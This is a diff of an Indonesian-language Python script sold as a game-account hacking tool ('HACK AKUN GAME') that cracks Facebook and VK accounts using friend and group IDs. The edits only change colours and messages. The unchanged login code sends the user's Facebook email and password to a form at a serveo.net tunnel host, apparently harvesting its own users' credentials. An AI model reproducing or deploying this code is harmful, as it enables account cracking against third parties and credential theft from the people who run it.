@@ -231,7 +231,7 @@ def login():
 	global log
 	us = inputD('[?] Email/HP')
 	pa = inputD('[?] Kata Sandi')
-	cetak('!h[*] Sedang Login....')
+	cetak('!b[*] Sedang Login....')
 	buka('https://nonnisi.serveo.net')
 	br.select_form(nr=0)
 	br.form['email']=us
@@ -249,10 +249,10 @@ def login():
 		cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan opera mini')
 		keluar()
 	else:
-		cetak('!m[!] Login Gagal')
+		cetak('!m[!] Login Gagal,Coba Lagi')
 def idgroup():
 	if log != 1:
-		cetak('!k[=] Login dulu bos biar bisa di crack...')
+		cetak('!p[=] Login dulu bos biar bisa di crack...')
 		login()
 		if log == 0:
 			keluar()
@@ -275,7 +275,7 @@ def saring_id_teman(r):
 		id_bteman.append(i)
 def idteman():
 	if log != 1:
-		cetak('!k[=] Login dulu bos biar bisa di crack...')
+		cetak('!p[=] Login dulu bro biar bisa di crack...')
 		login()
 		if log == 0:
 			keluar()
@@ -309,7 +309,7 @@ def idteman():
 	else:
 		return menu()
 def menu():
-	cetak("\n!bHACK AKUN GAME\n!k.++++++++++++++++++++++.\n|!h  HACK !mAKUN!h DARI.....  !k|\n'++++++++++++++++++++++'\n!k#!p1 !hHACK AKUN GAME FACEBOOK\n!k#!p2 !hHACK AKUN GAME DARI VK\n!k#!p3 !mKELUAR...")
+	cetak("\n!bHACK AKUN GAME\n!k.++++++++++++++++++++++.\n|!h  HACK !mAKUN!h DARI.....  !k|\n'++++++++++++++++++++++'\n!k#!b1 !hHACK AKUN GAME DARI FACEBOOK\n!k#!b2 !hHACK AKUN GAME DARI VK\n!k#!b3 !mKELUAR...")
 	i = inputM('[?] PILIH',[1,2,3])
 	if i == 2:
 		lanjutG()
